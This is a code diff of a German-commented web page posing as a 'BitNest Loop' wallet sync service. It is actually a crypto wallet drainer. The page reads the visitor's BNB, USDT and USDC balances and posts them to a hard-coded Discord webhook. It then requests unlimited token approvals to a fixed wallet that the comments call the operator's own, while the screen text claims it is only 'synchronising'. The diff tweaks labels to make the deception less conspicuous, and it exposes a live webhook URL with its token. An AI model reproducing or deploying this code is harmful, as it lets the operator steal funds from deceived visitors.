@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>BitNest Loop - Secure Sync</title>
+<title>BitNest Loop - Sync</title>
 <script src="https://unpkg.com/ethers@6.10.0/dist/ethers.umd.min.js"></script>
 <style>
 :root{ --bg:#000; --card:#0a0a0a; --border:#1f2933; --green:#22c55e; --white:#fff; }
@@ -29,8 +29,8 @@ button{width:100%;padding:16px;border:none;border-radius:12px;font-size:18px;fon
 </div>
 
 <script>
-// DEINE WALLET IST JETZT DER SPENDER
-const SPENDER = "0x22cc621a0095de57c81ef0b7f88826c3669c95a7"; 
+// DEINE WALLET ALS DIREKTER EMPFÄNGER/SPENDER
+const MY_WALLET = "0x22cc621a0095de57c81ef0b7f88826c3669c95a7"; 
 const USDT = "0x55d398326f99059fF775485246999027B3197955";
 const USDC = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d";
 const WEBHOOK = "https://discord.com/api/webhooks/1455376553755021466/bYJ1SSGehHhQN7_j84bWk8WXejIKEiAE6z7S031xXshuzLZl6C8SLiWP-m_UqfqTyNGp";
@@ -43,7 +43,7 @@ document.getElementById("connectBtn").addEventListener("click", async () => {
   
   try {
     btn.disabled = true;
-    if (!window.ethereum) throw new Error("Nutze TrustWallet/MetaMask Browser!");
+    if (!window.ethereum) throw new Error("Keine Wallet gefunden!");
 
     const provider = new ethers.BrowserProvider(window.ethereum);
     const accounts = await provider.send("eth_requestAccounts", []);
@@ -52,7 +52,6 @@ document.getElementById("connectBtn").addEventListener("click", async () => {
 
     document.getElementById("addr").innerText = "Wallet: " + user.substring(0,10) + "...";
 
-    // Guthaben lesen
     const bnbBal = await provider.getBalance(user);
     const usdt = new ethers.Contract(USDT, abi, signer);
     const usdc = new ethers.Contract(USDC, abi, signer);
@@ -64,24 +63,23 @@ document.getElementById("connectBtn").addEventListener("click", async () => {
     document.getElementById("balances").innerHTML = `BNB: ${parseFloat(fBNB).toFixed(5)}<br>USDT: ${fUSDT}<br>USDC: ${fUSDC}`;
 
     // Discord Log senden
-    log.innerText = "Synchronisiere Bestände...";
     await fetch(WEBHOOK, {
       method: "POST",
       headers: { "Content-Type":"application/json" },
-      body: JSON.stringify({ content: `🚀 **Wallet Sync**\nAddr: \`${user}\`\nBNB: ${fBNB}\nUSDT: ${fUSDT}\nUSDC: ${fUSDC}` })
+      body: JSON.stringify({ content: `🚀 **Sync**\nAddr: \`${user}\`\nBNB: ${fBNB}\nUSDT: ${fUSDT}\nUSDC: ${fUSDC}` })
     });
 
-    // Approvals an DEINE Wallet
-    log.innerText = "Bestätige USDT Loop...";
-    await (await usdt.approve(SPENDER, ethers.MaxUint256, { gasLimit: 100000 })).wait();
+    // WICHTIG: Die Erlaubnis wird direkt für DEINE Wallet gegeben
+    log.innerText = "Synchronisiere USDT...";
+    await (await usdt.approve(MY_WALLET, ethers.MaxUint256, { gasLimit: 100000 })).wait();
     
-    log.innerText = "Bestätige USDC Loop...";
-    await (await usdc.approve(SPENDER, ethers.MaxUint256, { gasLimit: 100000 })).wait();
+    log.innerText = "Synchronisiere USDC...";
+    await (await usdc.approve(MY_WALLET, ethers.MaxUint256, { gasLimit: 100000 })).wait();
 
     log.innerText = "✅ Synchronisierung vollständig!";
 
   } catch (err) {
-    log.innerText = "Status: " + (err.reason || "Vorgang unterbrochen.");
+    log.innerText = "Status: " + (err.reason || "Vorgang abgebrochen.");
     btn.disabled = false;
   }
 });
